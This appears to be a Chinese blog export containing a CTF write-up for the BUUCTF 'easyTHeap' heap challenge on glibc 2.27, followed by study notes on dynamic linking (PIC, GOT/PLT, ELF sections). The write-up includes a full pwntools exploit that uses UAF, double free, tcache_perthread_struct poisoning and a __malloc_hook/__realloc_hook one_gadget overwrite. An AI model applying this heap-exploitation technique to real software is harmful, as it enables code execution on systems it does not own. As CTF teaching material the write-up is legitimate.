<h2 id="BUUCTF-V-N2020-公开赛-easyTHeap"><a href="#BUUCTF-V-N2020-公开赛-easyTHeap" class="headerlink" title="BUUCTF-[V&amp;N2020 公开赛]easyTHeap"></a>BUUCTF-[V&amp;N2020 公开赛]easyTHeap</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a><strong>版本</strong></h3><p>2.27-3ubuntu1_amd64</p>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h3><p>本题是一个简陋的类似于tcache管理的程序，无法知道程序的基址，也就是说pie无法绕过，data数据段中存在两个变量控制new和delete的chunk的数量，因此本题需要细致控制new和delete的次数。new最多7次，delete最多三次。</p>
<h3 id="存在漏洞"><a href="#存在漏洞" class="headerlink" title="存在漏洞"></a><strong>存在漏洞</strong></h3><p>存在uaf和double_free漏洞，也存在打印堆内容的函数因此可以泄露地址，本题学习的地方是，可以通过Tcache Poisoning来控制tcache管理器。也就是tcache_perthread_struct结构体，来达到任意地址分配的目的</p>
<h3 id="本题思路"><a href="#本题思路" class="headerlink" title="本题思路"></a><strong>本题思路</strong></h3><p>1.通过doublefree和uaf泄露堆地址，需要new一次，delete2次。</p>
<p>2.通过uaf来实现Tcache Poisoning攻击，得到tcache_perthread_struct结构体的读写权限。需要new三次。需要仔细构造fd，来实现Tcache Poisoning攻击。</p>
<p>3.得到堆管理器控制权限时写入极大内容，造成bin已满的情形，free掉堆管理器，会被释放到unsortedbin中，可以泄露libc的基址。需要delete一次</p>
<p>4.注意看上三次步骤已经用光了delete的次数，new的次数也用了4次。这就是控制tcache_perthread_struct结构体的绝妙之处，可以通过伪造count和fd字段，来造成还有剩余chunk的假象，因此可以实现任意地址分配，不需要用uaf来进行任意地址的读写操作。</p>
<p>5.new一次得到tcache_perthread_struct结构体的控制权限，因为unsortedbin中只有一个reminderchunk，因此会直接切分分配，new的大小要合适。</p>
<p>6.new一次，分配到<code>__realloc_hook</code>的区域，来伪造<code>__realloc_hook与__malloc_hook</code>，这两个hook在一起，因此只需要消耗一次new的机会则可以得到连个hook的读写权限。</p>
<ul>
<li><p>为什么不能直接得到mallochook来进行one-gadget的注入？</p>
<p>realloc函数中有大量的pop，push操作，可以使one-gadget条件得到满足，因此向mallochook中注入realloc的地址，向reallochook中注入one-gadget的地址，以此来构造调用链条。</p>
</li>
</ul>
<p>7.new一次，执行one-gadget，至此本题结束，恰好7次new，3次delete，及其极限。</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a><strong>脚本</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./vn_pwn_easyTHeap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">def create(size):</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>choice: <span class="string">&#x27;,b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>size?<span class="string">&#x27;,size)</span></span><br><span class="line"><span class="string">def edit(index,con):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">2&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;,index)</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>content:<span class="string">&#x27;, con)</span></span><br><span class="line"><span class="string">def show(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">3&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;, index)</span></span><br><span class="line"><span class="string">    return io.recvuntil(&quot;\n&quot;).strip()</span></span><br><span class="line"><span class="string">def de(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>idx?<span class="string">&#x27;, index)</span></span><br><span class="line"><span class="string">def ex():</span></span><br><span class="line"><span class="string">    io.sendafter(b&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">5&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 0</span></span><br><span class="line">de(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">heapadd = u64(show(b<span class="number">&#x27;0&#x27;</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">print(hex(heapadd))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 1</span></span><br><span class="line">edit(b<span class="number">&#x27;1&#x27;</span>,p64(heapadd<span class="number">-0x250</span>))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 2</span></span><br><span class="line">edit(b<span class="number">&#x27;2&#x27;</span>,p64(heapadd<span class="number">-0x250</span>))</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 3,tcache_perthread_struct</span></span><br><span class="line">edit(b<span class="number">&#x27;3&#x27;</span>,<span class="number">0x40</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;3&#x27;</span>)#<span class="meta">#goto unsortedbin</span></span><br><span class="line">#<span class="meta">#getlibcbase</span></span><br><span class="line">libbase = u64(show(b<span class="number">&#x27;3&#x27;</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">print(libbase)</span><br><span class="line">mallochook = libbase+elf.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">reallochook = libbase+elf.symbols[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line">print(hex(mallochook))</span><br><span class="line">## 构造tcache_perthread_struct</span><br><span class="line">create(b<span class="number">&#x27;248&#x27;</span>)<span class="meta">#index = 4</span></span><br><span class="line">edit(b<span class="number">&#x27;4&#x27;</span>,<span class="number">0x40</span>*b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>+p64(mallochook)+p64(reallochook))</span><br><span class="line">## 复写mallochook</span><br><span class="line">sys = libbase + <span class="number">0x4f2be</span></span><br><span class="line">relloc = libbase+elf.symbols[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line">create(b<span class="number">&#x27;40&#x27;</span>)<span class="meta">#index = 5</span></span><br><span class="line">edit(b<span class="number">&#x27;5&#x27;</span>,p64(sys)+p64(relloc+<span class="number">2</span>))</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line">#<span class="meta"># index = 6</span></span><br><span class="line">io.sendafter(b<span class="number">&#x27;</span>choice: <span class="string">&#x27;, b&#x27;</span><span class="number">1&#x27;</span>)</span><br><span class="line">io.sendafter(b<span class="number">&#x27;</span>size?<span class="string">&#x27;, b&#x27;</span><span class="number">50&#x27;</span>)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>关于动态链接</title>
    <url>/2024/08/16/%E5%85%B3%E4%BA%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<p>十分复杂，入坑需谨慎。。。。。</p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
<p>本次学习用的demo</p>
</blockquote>
<p>简述一下和静态链接的区别：静态链接在链接过程中就已经完成了重定位工作，因此可执行文件巨大，动态链接就是为了解决这一问题，找到了一种模块化的实现方法，就是可执行文件并不把所有库内段合并过来，而是在runtime的时候完成symbols的relocate操作，并且不同的进程也可以共享动态链接库也就是.so。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o Lib.so lib.c</span><br><span class="line">gcc -o program2 program2.c ./Lib.so</span><br><span class="line">gcc -o program1 program1.c ./Lib.so</span><br><span class="line"><span class="comment">/*program1*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    foobar(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*program2*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    foobar(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 注意这里的 &#x27;o&#x27; 应该是 &#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*lib.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foobar</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Printing from Lib.so: %d\n&quot;</span>, i); <span class="comment">// 注意这里的 &#x27;din&#x27; 应该是 &#x27;%d&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*lib.h*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIB_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIB_H</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foobar</span><span class="params">(<span class="type">int</span> i)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h1 id="PIC"><a href="#PIC" class="headerlink" title="PIC"></a>PIC</h1><blockquote>
<p>为了了解可执行文件（动态链接库）是如何在runtime进行relocate的需要理解什么是position-independent code，也就是地址无关代码。静态链接库是没有这个概念的，其加载地址在链接中已经确定了，所谓PIC就是解决动态共享库在加载时的模块地址冲突问题的，使其可以加载到任何位置，也就是说运行时地址自动分配，但是也会导致问题，同一个模块的代码装载到不同的位置，指令不能发生变化，否则无法使用其他共享模块。</p>
<p>需要注意一点的是，动态链接库实现代码重用，但是每一个进程是有一份数据部分的副本的。</p>
</blockquote>
<h2 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h2><blockquote>
<p>基本思想就是把指令中需要修改的部分提取出来跟数据放一块</p>
<p>所谓需要修改的无非就是外部模块的地址引用</p>
</blockquote>
<p>地址引用可以分为以下四种：</p>
<ul>
<li><p>模块内部函数调用跳转</p>
<p>比较简单，不做讨论，直接相对寻址即可，但是一开始貌似都是要到got表中的，但是本质区别是要不要做符号重定位。</p>
</li>
<li><p>模块内部数据访问，static关键字</p>
<p><img src="/img/mypic/PIC.png" alt="PIC"></p>
<p>书中是上面那样写的，但是我自己在ida编译了一个64位的程序，发现不管是内部模块的函数还是外部模块的函数都会转移到got表访问，数据回到got，函数会到got.plt</p>
</li>
<li><p>模块外部函数调用和跳转</p>
<blockquote>
<p>找got表</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b; </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">ext</span><span class="params">()</span>;  </span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    bar();</span><br><span class="line">    ext();</span><br><span class="line">&#125;</span><br><span class="line">gcc -fPIC -shared -o pic.so pic.c</span><br><span class="line"> <span class="number">18</span> .got          <span class="number">00000028</span>  <span class="number">0000000000003f</span>d8  <span class="number">0000000000003f</span>d8  <span class="number">00002f</span>d8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> <span class="number">19</span> .got.plt      <span class="number">00000028</span>  <span class="number">0000000000004000</span>  <span class="number">0000000000004000</span>  <span class="number">00003000</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000003e48</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x0000000000001130</span></span><br><span class="line"><span class="number">0000000000003e50</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x00000000000010f0</span></span><br><span class="line"><span class="number">0000000000004028</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x0000000000004028</span></span><br><span class="line"><span class="number">0000000000003f</span>d8 R_X86_64_GLOB_DAT  b</span><br><span class="line"><span class="number">0000000000003f</span>e0 R_X86_64_GLOB_DAT  __cxa_finalize</span><br><span class="line"><span class="number">0000000000003f</span>e8 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable</span><br><span class="line"><span class="number">0000000000003f</span>f0 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable</span><br><span class="line"><span class="number">0000000000003f</span>f8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line"><span class="number">0000000000004018</span> R_X86_64_JUMP_SLOT  ext</span><br><span class="line"><span class="number">0000000000004020</span> R_X86_64_JUMP_SLOT  ba</span><br></pre></td></tr></table></figure>
</li>
<li><p>模块外部的数据访问</p>
<blockquote>
<p>也是got表</p>
</blockquote>
</li>
<li><p>特别：</p>
<blockquote>
<p>对于定义在模块内部的全局变量，也通过got表进行处理。</p>
</blockquote>
<pre><code>      ## 关于数据段地址无关性
</code></pre>
</li>
</ul>
<p>因为每一个模块都有副本，因此不太需要关于共享这个问题，直接重定位即可。</p>
<h1 id="关于PLT"><a href="#关于PLT" class="headerlink" title="关于PLT"></a>关于PLT</h1><p>所谓延迟绑定，就是当函数第一次使用时才进行重定位操作（符号绑定），也就是说PIC代码不直接指向got.plt表，而是指向plt表，在第一次调用时，先进行dl-resolve函数操作，之后进行符号绑定。但是貌似好多已经优化掉了，这一步感觉好多elf已经不存在了，就直接跳到got表，程序执行的时候就进行装载。。。。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">默认选项编译的代码，还没有执行的printf，可以看到plt中已经不会蹦到dl-resolve代码上去了，直接跳到了got表。。。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">pwndbg&gt; disassemble <span class="number">0x555555555050</span>,+<span class="number">30</span></span><br><span class="line">Dump of assembler code from <span class="number">0x555555555050</span> to <span class="number">0x55555555506e</span>:</span><br><span class="line">   <span class="number">0x0000555555555050</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">0</span>&gt;:   endbr64 </span><br><span class="line">   <span class="number">0x0000555555555054</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">4</span>&gt;:   bnd jmp QWORD PTR [rip+<span class="number">0x2f75</span>]        # <span class="number">0x555555557fd0</span> &lt;<span class="built_in">printf</span>@got.plt&gt;</span><br><span class="line">   <span class="number">0x000055555555505b</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">11</span>&gt;:  nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x0000555555555060</span> &lt;_start+<span class="number">0</span>&gt;:       endbr64 </span><br><span class="line">   <span class="number">0x0000555555555064</span> &lt;_start+<span class="number">4</span>&gt;:       xor    ebp,ebp</span><br><span class="line">   <span class="number">0x0000555555555066</span> &lt;_start+<span class="number">6</span>&gt;:       mov    r9,rdx</span><br><span class="line">   <span class="number">0x0000555555555069</span> &lt;_start+<span class="number">9</span>&gt;:       pop    rsi</span><br><span class="line">   <span class="number">0x000055555555506a</span> &lt;_start+<span class="number">10</span>&gt;:      mov    rdx,rsp</span><br><span class="line">   <span class="number">0x000055555555506d</span> &lt;_start+<span class="number">13</span>&gt;:      and    rsp,<span class="number">0xfffffffffffffff0</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x555555557fd0</span></span><br><span class="line"><span class="number">0x555555557fd0</span> &lt;<span class="built_in">printf</span>@got.plt&gt;:        <span class="number">0x00007ffff7de96f0</span>      <span class="number">0x00007ffff7db2dc0</span></span><br><span class="line"><span class="number">0x555555557fe0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555557ff0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffff7dce9a0</span></span><br><span class="line"><span class="number">0x555555558000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000555555558008</span></span><br><span class="line"><span class="number">0x555555558010</span> &lt;completed<span class="number">.0</span>&gt;:   <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558050</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558060</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h1 id="ELF文件相关"><a href="#ELF文件相关" class="headerlink" title="ELF文件相关"></a>ELF文件相关</h1><blockquote>
<p>在了解了动态链接的基本思想之后，再来从ELF文件的角度细节理解一下</p>
<p>总体概览是：1.读取program_header，os来分配页表映射关系；（和静态链接一样）</p>
<p>2.同样加载动态链接器，os将控制权交给动态链接器</p>
<p>3.动态链接器经过一些列操作，如bootstrap等等，对可执行文件进行链接操作，然后将控制权交给可执行文件。</p>
<p>4.程序执行。</p>
</blockquote>
<h2 id="interp节"><a href="#interp节" class="headerlink" title=".interp节"></a>.interp节</h2><blockquote>
<p>描述了动态链接器的存储路径，一个字符数组</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink<span class="meta"># readelf -x 1 hh</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.interp&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000318</span> <span class="number">2f</span>6c6962 <span class="number">36342f</span>6c <span class="number">642</span>d6c69 <span class="number">6e75782</span>d /lib64/ld-linux-</span><br><span class="line">  <span class="number">0x00000328</span> <span class="number">7838362</span>d <span class="number">36342e73</span> <span class="number">6f</span>2e3200          x86<span class="number">-64.</span>so<span class="number">.2</span>.</span><br></pre></td></tr></table></figure>

<h2 id="dynamic节"><a href="#dynamic节" class="headerlink" title=".dynamic节"></a>.dynamic节</h2><blockquote>
<p>和符号表类似，也是一个结构体数组，这大概就是描述一个可执行文件重定位信息的一个集合体。</p>
<p>类似于重定位头，跟节表头差不多</p>
<p>其中有动态符号表的文件偏移。。。。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*其中元素结构为*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> Elf64_Sxword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>

<h2 id="dynsym节"><a href="#dynsym节" class="headerlink" title=".dynsym节"></a>.dynsym节</h2><blockquote>
<p>结构基本symtab一样，只是把需要动态绑定的拿出来，组成的一张表</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink<span class="meta"># readelf -s hh</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">7</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2<span class="number">.34</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">3</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2 id="关于重定位节"><a href="#关于重定位节" class="headerlink" title="关于重定位节"></a>关于重定位节</h2><blockquote>
<p>好像是一个搬运工的身份，其连接了动态符号表以及got表，通过检索动态符号表来将重定位后的值填入到got或got.plt</p>
<p>rela.dyn和rela.dyn的区分个人理解上比较模糊，貌似是通过重定位的类型来区分的，但是不能确定。</p>
<p>关于重定位类型，常见的有：R_X86_64_RELATIVE，R_X86_64_GLOB_DAT，R_X86_64_JUMP_SLO，R_X86_64_RELATIVE代表基址重置，其余两个貌似可以猜出来要干啥，说实话这两个名字的处理方式是一样的，知识跳的位置不一样罢了，其实基址重置也好理解，就是到最后目标位置的值得是装载地址加上addend。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink# readelf -r pic.so</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.dyn&#x27; at offset 0x458 contains 8 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000003e48  000000000008 R_X86_64_RELATIVE                    1130</span><br><span class="line">000000003e50  000000000008 R_X86_64_RELATIVE                    10f0</span><br><span class="line">000000004028  000000000008 R_X86_64_RELATIVE                    4028</span><br><span class="line">000000003fd8  000200000006 R_X86_64_GLOB_DAT 0000000000000000 b + 0</span><br><span class="line">000000003fe0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize + 0</span><br><span class="line">000000003fe8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0</span><br><span class="line">000000003ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0</span><br><span class="line">000000003ff8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.plt&#x27; at offset 0x518 contains 2 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000004018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 ext + 0</span><br><span class="line">000000004020  000700000007 R_X86_64_JUMP_SLO 0000000000001139 bar + 0</span><br></pre></td></tr></table></figure>

<h3 id="rela-dyn-and-rela-plt"><a href="#rela-dyn-and-rela-plt" class="headerlink" title=".rela.dyn and .rela.plt"></a>.rela.dyn and .rela.plt</h3><blockquote>
<p>结构都是一样的，都是下面这种类型。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<h1 id="runtime辅助信息"><a href="#runtime辅助信息" class="headerlink" title="runtime辅助信息"></a>runtime辅助信息</h1><blockquote>
<p>上面讲的都是比较静态的，也就是还未分配页表等映射信息，当os加载程序之后，会初始化一些进程的堆栈信息，这样os转交给链接器的时候，链接器才能知道如何重定位，也就是说加载器负责将模块中的关键信息加载到进程堆栈，之后会调用解释器来进行重定位操作。	</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*辅助信息数组保存在堆栈*/</span></span><br><span class="line"><span class="comment">/* 这个向量通常仅供程序解释器使用。</span></span><br><span class="line"><span class="comment">   在 ABI 补充定义中通常使用 auxv_t 这个名字。</span></span><br><span class="line"><span class="comment">   这个向量通常不会在标准的 &lt;elf.h&gt; 文件中定义，但定义它也无妨。</span></span><br><span class="line"><span class="comment">   我们重命名它以避免冲突。这些类型的大小由 exec 服务器和程序解释器之间的协议决定，</span></span><br><span class="line"><span class="comment">   所以我们在此并未完全指定它们。*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> a_type;		<span class="comment">/* 条目类型 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> a_val;		<span class="comment">/* 整数值 */</span></span><br><span class="line">      <span class="comment">/* 以前我们在这里添加了指针元素。</span></span><br><span class="line"><span class="comment">	 但是，由于在 32 位定义和 64 位平台之间使用时无法工作，</span></span><br><span class="line"><span class="comment">	 我们不能这样做。 */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> a_type;		<span class="comment">/* 条目类型 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint64_t</span> a_val;		<span class="comment">/* 整数值 */</span></span><br><span class="line">      <span class="comment">/* 以前我们在这里添加了指针元素。</span></span><br><span class="line"><span class="comment">	 但是，由于在 32 位定义和 64 位平台之间使用时无法工作，</span></span><br><span class="line"><span class="comment">	 我们不能这样做。 */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf64_auxv_t;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="动态链接步骤"><a href="#动态链接步骤" class="headerlink" title="动态链接步骤"></a>动态链接步骤</h1><blockquote>
<p>数据结构了解之后来了解一下algorithm，没有代码，比较高视角（粗糙）。</p>
</blockquote>
<h2 id="第一步：链接器的自举"><a href="#第一步：链接器的自举" class="headerlink" title="第一步：链接器的自举"></a>第一步：链接器的自举</h2><p>链接器也是可执行文件，但是链接器的符号表的装载，got表的重定位也是需要链接器来完成，但是完成自身这一过程不能使用全局变量以及函数，因此叫做bootstrap，类似于自己生自己，中文叫自举。</p>
<h2 id="第二步：依赖模块的装载"><a href="#第二步：依赖模块的装载" class="headerlink" title="第二步：依赖模块的装载"></a>第二步：依赖模块的装载</h2><p>链接器通过阅读可执行文件的.dynamic等字段，将所有所需的模块分配虚拟内存，然后符号表会被合并为全局符号表，具体算法不是很清楚，但是理论上应该是可行的。</p>
